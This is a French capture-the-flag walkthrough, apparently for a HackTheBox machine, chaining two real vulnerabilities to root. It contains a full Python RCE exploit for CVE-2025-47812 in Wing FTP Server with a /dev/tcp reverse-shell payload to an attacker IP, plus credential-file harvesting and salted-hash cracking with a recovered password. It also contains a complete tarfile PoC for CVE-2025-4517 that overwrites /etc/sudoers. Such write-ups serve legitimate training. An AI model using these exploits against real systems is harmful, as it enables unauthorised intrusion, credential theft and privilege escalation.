# WingData - WriteUp
> **OS:** Debian 12 | **Difficulté:** Easy | **IP:** 10.129.244.106

---

## Phase 1 - Reconnaissance

```bash
nmap -Pn -p- --min-rate 5000 10.129.244.106
nmap -Pn -sCV -p 22,80 10.129.244.106
```

| Port | Service | Info |
|---|---|---|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache 2.4.66, redirect → wingdata.htb |

Ajouter au hosts : `10.129.244.106 wingdata.htb ftp.wingdata.htb`

Le site principal est un site vitrine "WingData". Le code source révèle un lien **"Client Portal"** vers `http://ftp.wingdata.htb/`.

---

## Phase 2 - Wing FTP Server 7.4.3

`ftp.wingdata.htb` héberge **Wing FTP Server v7.4.3** (Free Edition) avec un login web. L'accès **anonymous** est activé (pas de password requis).

### CVE-2025-47812 - Unauthenticated RCE

Wing FTP ≤ 7.4.3 est vulnérable à une injection de code Lua via un NULL byte dans le username. Le serveur écrit les sessions comme des scripts Lua exécutables. Un NULL byte dans le username permet d'injecter du code Lua arbitraire.

**Exploit :**

```python
#!/usr/bin/env python3
"""CVE-2025-47812 - Wing FTP Server RCE"""
import requests, sys

TARGET = sys.argv[1]  # ftp.wingdata.htb
LHOST = sys.argv[2]   # attacker IP
LPORT = sys.argv[3]   # listener port
BASE = f"http://{TARGET}"

LUA_PAYLOAD = f']]os.execute("bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'")--'
USERNAME = "anonymous\x00" + LUA_PAYLOAD

# Step 1: Login avec injection
r = requests.post(f"{BASE}/loginok.html",
    data={"username": USERNAME, "password": "", "submit_btn": " Login "},
    allow_redirects=False)
uid = r.cookies.get("UID")

# Step 2: Trigger l'exécution Lua
requests.get(f"{BASE}/dir.html", cookies={"UID": uid})
print(f"[+] Check listener on {LHOST}:{LPORT}")
```

```bash
nc -lvnp 9001
python3 exploit.py ftp.wingdata.htb 10.10.17.198 9001
# → Shell en tant que wingftp
```

---

## Phase 3 - User (wacky)

### Extraction des hashes

Wing FTP stocke les credentials dans des fichiers XML :

```bash
grep -ri "password" /opt/wftpserver/Data/ 2>/dev/null
```

Hashes trouvés dans `/opt/wftpserver/Data/1/users/*.xml` et la config du domaine révèle le schéma de hashing :

```bash
grep -i "salt\|SHA256" /opt/wftpserver/Data/1/settings.xml
# EnableSHA256: 1
# EnablePasswordSalting: 1
# SaltingString: WingFTP
```

**Format : `SHA256(password + "WingFTP")`**

Le code source Lua dans `/opt/wftpserver/lua/ServerInterface.lua` confirme :
```lua
temppass = user.password..salt_string
password_md5 = sha2(temppass)
```

### Crack du hash

```bash
# hashcat custom avec salt append
# Mode 1410 = sha256($pass.$salt)
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

Ou en Python (si hashcat mode 1410 pose problème) :
```python
# SHA256(password + "WingFTP") pour chaque mot de rockyou
import hashlib
with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
    for line in f:
        pw = line.strip()
        if hashlib.sha256((pw + "WingFTP").encode()).hexdigest() == "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca":
            print(f"CRACKED: {pw}")
            break
```

**Résultat : `wacky : !#7Blushing^*Bride5`**

### SSH

```bash
ssh wacky@10.129.244.106
# password: !#7Blushing^*Bride5
cat ~/user.txt
```

---

## Phase 4 - Root (CVE-2025-4517)

### Sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Le script extrait un tar dans un staging directory avec `tarfile.extractall(filter="data")`.

**Python 3.12.3** est vulnérable à **CVE-2025-4517** : `os.path.realpath()` retourne un résultat tronqué quand la résolution de symlinks dépasse PATH_MAX (4096 bytes). Le filtre `data` de tarfile utilise `realpath()` pour vérifier que les fichiers restent dans le répertoire de destination. Si `realpath()` tronque, la vérification est bypassée.

### Exploit CVE-2025-4517

Le PoC crée un tar avec :
1. **16 symlinks chainés** qui se résolvent mutuellement (chaque résolution ajoute ~247 chars)
2. Un **symlink final** qui dépasse PATH_MAX → `realpath()` ne le résout plus
3. Un **symlink "escape"** vers `/etc` via le chemin non résolu
4. Un **hardlink** vers `escape/sudoers`
5. Un **fichier régulier** qui écrase le hardlink → écrit dans `/etc/sudoers`

```python
import tarfile, os, io

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("/opt/backup_clients/backups/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../etc"
    tar.addfile(e)
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)
    content = b"wacky ALL=(ALL) NOPASSWD:ALL\n"
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
```

### Exécution

```bash
python3 poc.py
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_poc
# [+] Extraction completed

sudo -l
# (ALL) NOPASSWD: ALL

sudo /bin/bash
cat /root/root.txt
# c794091a39b1e79e7ac7ca626db009b2
```

---

## Kill Chain

```
┌──────────────────────────┐
│ Nmap → SSH + HTTP        │
│ wingdata.htb → ftp.      │
│ Wing FTP Server 7.4.3    │
└────────────┬─────────────┘
             │ CVE-2025-47812
             │ NULL byte Lua injection
┌────────────▼─────────────┐
│ Shell wingftp            │
│ XML configs → hashes     │
│ SHA256(pw + "WingFTP")   │
└────────────┬─────────────┘
             │ Hashcat → wacky:!#7Blushing^*Bride5
┌────────────▼─────────────┐
│ SSH wacky                │
│ sudo restore script      │
│ Python 3.12.3            │
└────────────┬─────────────┘
             │ CVE-2025-4517
             │ tarfile PATH_MAX overflow
             │ → overwrite /etc/sudoers
┌────────────▼─────────────┐
│ ROOT                     │
└──────────────────────────┘
```

## Flags
- **Root:** c794091a39b1e79e7ac7ca626db009b2
